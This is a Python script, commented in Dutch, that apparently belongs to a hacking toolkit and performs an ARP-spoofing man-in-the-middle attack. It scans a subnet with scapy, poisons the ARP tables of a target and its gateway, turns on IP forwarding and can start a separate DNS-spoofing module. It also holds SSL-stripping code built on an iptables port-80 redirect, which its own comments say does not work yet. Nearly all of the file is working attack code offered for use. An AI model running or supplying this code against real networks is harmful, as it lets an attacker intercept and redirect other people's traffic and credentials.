import os
from scapy.all import Ether, ARP, srp, send
import ipaddress
import subprocess
import time
import argparse

#https://askubuntu.com/questions/1304100/ip-forwarding-does-not-work

################# MITM #################
def disable_ip_routing():
    # Disable IP routing
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    os.system("sudo iptables --policy FORWARD DROP")

def enable_ip_routing():
    # Enable IP routing
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print(os.system("sudo iptables --policy FORWARD ACCEPT"))

def generate_host_ips(network_address, subnet_mask):
    # Combineer het netwerkadres en het subnetmasker om een netwerkobject te maken
    network = ipaddress.IPv4Network(f"{network_address}/{subnet_mask}", strict=False)
    host_ips = [str(ip) for ip in network.hosts()]
    return host_ips

def get_mac(ip):
    # MAC-adres van een IP-adres ophalen
    response = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=1, verbose=0)
    if len(response[0])!=0:
        return response[0][0][1].src
    else:
        return None

def get_all_mac(network_ip, subnet_mask):
    # MAC-adres van alle apparaten in het netwerk ophalen
    device_list=[]
    ips=generate_host_ips(network_ip, subnet_mask)
    for ip in ips:
        print(f"Getting mac address for {ip}")
        if get_mac(ip):
            device_list.append((ip, get_mac(ip)))
    return device_list

def get_default_gateway():
    # MAC-adres van een default gateway ophalen
    gateway_ip=subprocess.check_output("ip route show default | awk '{print $3}'",shell=True).decode("utf-8").strip()
    mac_address=get_mac(gateway_ip)
    return (gateway_ip, mac_address)

def trick_targets(target_ip,target_mac, gateway_adress, gateway_mac):
    #Verzendt valse ARP-pakketten naar de target en de gateway
    send(ARP(op=2, pdst=target_ip, psrc=gateway_adress, hwdst=target_mac))
    send(ARP(op=2, pdst=gateway_adress, psrc=target_ip, hwdst=gateway_mac))
    time.sleep(1)

def restore_arp(target_ip, target_mac, gateway_adress, gateway_mac):
    # Herstellen van de ARP-tabellen van de target en de gateway
    send(ARP(op=2, pdst=gateway_adress, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
    send(ARP(op=2, pdst=target_ip, psrc=gateway_adress, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)

################# SSL STRIP #################

# Op dit moment werkt sslstrip niet. De code is wel al geschreven, maar de sslstrip tool werkt niet correct.
def activate_ssl_stripping():
    # Activate ssl stripping
    os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
    subprocess.run("python3", "sslstrip/sslstrip.py", "-a", "-f")

def deactivate_ssl_stripping():
    # Deactivate ssl stripping
    os.system("sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")

def install_ssl_strip():
    # Install ssl strip
    if not os.path.exists("./sslstrip"):
        os.system("bash resources/install_sslstrip.sh")

################# EXECUTE #################
def mitm(target_address, sslstrip_enabled, dns_spoof_enabled):
    # Voer de MITM-aanval uit
    running_side_processes=[]
    enable_ip_routing()
    gateway_adress, gateway_mac=get_default_gateway()
    try: # Op dit moment zal Flask nooit sslsltrip activeren aangezien de tool niet werkt.
        # if sslstrip_enabled:
        #     install_ssl_strip()
        #     activate_ssl_stripping()
        if dns_spoof_enabled:
            subprocess.Popen([f'xterm -fs 14 -fa DejaVuSansMono -e "source .venv/bin/activate && echo dns spoof terminal && sudo python3 modules/mitm/dns_spoof_module.py"'],shell=True)
        while True:
            trick_targets(target_address, get_mac(target_address), gateway_adress, gateway_mac)
    except KeyboardInterrupt:
        print("Stopping MITM attack")
    # if sslstrip_enabled:
    #     deactivate_ssl_stripping()
    for process in running_side_processes:
        process.kill()

    if dns_spoof_enabled:
        subprocess.run(f"sudo iptables -D FORWARD -j NFQUEUE --queue-num 0", shell=True)

    restore_arp(target_address, get_mac(target_address), gateway_adress, gateway_mac)
    disable_ip_routing()

def main():
    parser = argparse.ArgumentParser(description="Script om een Man in The Middle aanval uit te voeren.")

    parser.add_argument("target_ip", help="IP address of the target")
    parser.add_argument("--sslstrip", action="store_true", help="SSL stripping activeren. WERKT NOG NIET") # Tool doesn't work for now
    parser.add_argument("--dnsspoof", action="store_true", help="DNS spoofing vie dit script activeren. Standaard pad voor fake DNS records wordt gebruikt.")
    args = parser.parse_args()
    target_ip = args.target_ip
    sslstrip_enabled = args.sslstrip
    dns_spoof_enabled = args.dnsspoof

    mitm(target_ip, sslstrip_enabled, dns_spoof_enabled)

if __name__ == "__main__":
    main()
